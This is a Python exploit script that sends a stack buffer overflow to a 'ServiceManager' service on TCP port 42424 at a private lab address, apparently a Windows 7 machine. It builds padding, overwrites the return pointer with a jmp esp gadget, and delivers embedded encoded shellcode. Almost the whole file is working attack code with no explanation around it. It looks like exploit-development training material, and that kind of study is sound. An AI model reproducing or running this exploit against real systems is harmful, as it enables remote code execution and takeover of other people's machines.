#!/usr/bin/python
import socket
import struct

#set up ip and port
ServiceManagerIP = "192.168.150.25"
ServiceManagerPort = 42424

buf_totlen = 400
offset_srp = 146

ptr_jmp_esp = 0x080414c3

sub_esp_10 = "\x83\xec\x10"

shellcode =  ("\xdd\xc5\xd9\x74\x24\xf4\xbd\xb9\x2a\xef\xfe\x5a\x29\xc9\xb1"
"\x52\x31\x6a\x17\x83\xea\xfc\x03\xd3\x39\x0d\x0b\xdf\xd6\x53"
"\xf4\x1f\x27\x34\x7c\xfa\x16\x74\x1a\x8f\x09\x44\x68\xdd\xa5"
"\x2f\x3c\xf5\x3e\x5d\xe9\xfa\xf7\xe8\xcf\x35\x07\x40\x33\x54"
"\x8b\x9b\x60\xb6\xb2\x53\x75\xb7\xf3\x8e\x74\xe5\xac\xc5\x2b"
"\x19\xd8\x90\xf7\x92\x92\x35\x70\x47\x62\x37\x51\xd6\xf8\x6e"
"\x71\xd9\x2d\x1b\x38\xc1\x32\x26\xf2\x7a\x80\xdc\x05\xaa\xd8"
"\x1d\xa9\x93\xd4\xef\xb3\xd4\xd3\x0f\xc6\x2c\x20\xad\xd1\xeb"
"\x5a\x69\x57\xef\xfd\xfa\xcf\xcb\xfc\x2f\x89\x98\xf3\x84\xdd"
"\xc6\x17\x1a\x31\x7d\x23\x97\xb4\x51\xa5\xe3\x92\x75\xed\xb0"
"\xbb\x2c\x4b\x16\xc3\x2e\x34\xc7\x61\x25\xd9\x1c\x18\x64\xb6"
"\xd1\x11\x96\x46\x7e\x21\xe5\x74\x21\x99\x61\x35\xaa\x07\x76"
"\x3a\x81\xf0\xe8\xc5\x2a\x01\x21\x02\x7e\x51\x59\xa3\xff\x3a"
"\x99\x4c\x2a\xec\xc9\xe2\x85\x4d\xb9\x42\x76\x26\xd3\x4c\xa9"
"\x56\xdc\x86\xc2\xfd\x27\x41\x2d\xa9\xb1\x8e\xc5\xa8\xbd\xa0"
"\xe2\x24\x5b\xaa\x1c\x61\xf4\x43\x84\x28\x8e\xf2\x49\xe7\xeb"
"\x35\xc1\x04\x0c\xfb\x22\x60\x1e\x6c\xc3\x3f\x7c\x3b\xdc\x95"
"\xe8\xa7\x4f\x72\xe8\xae\x73\x2d\xbf\xe7\x42\x24\x55\x1a\xfc"
"\x9e\x4b\xe7\x98\xd9\xcf\x3c\x59\xe7\xce\xb1\xe5\xc3\xc0\x0f"
"\xe5\x4f\xb4\xdf\xb0\x19\x62\xa6\x6a\xe8\xdc\x70\xc0\xa2\x88"
"\x05\x2a\x75\xce\x09\x67\x03\x2e\xbb\xde\x52\x51\x74\xb7\x52"
"\x2a\x68\x27\x9c\xe1\x28\x57\xd7\xab\x19\xf0\xbe\x3e\x18\x9d"
"\x40\x95\x5f\x98\xc2\x1f\x20\x5f\xda\x6a\x25\x1b\x5c\x87\x57"
"\x34\x09\xa7\xc4\x35\x18")



# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I", ptr_jmp_esp)
buf += "BBBB"
buf += sub_esp_10
buf += shellcode
buf += "D"*(buf_totlen - len(buf))


#Attempt to send message
try:
    print "Sending buffer"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Connect to Win7 machine
    connect = s.connect((ServiceManagerIP, ServiceManagerPort))
    s.send(buf + '\r\n')
    s.recv(1024)
    s.close()
    
except:
    print "Could not connect"
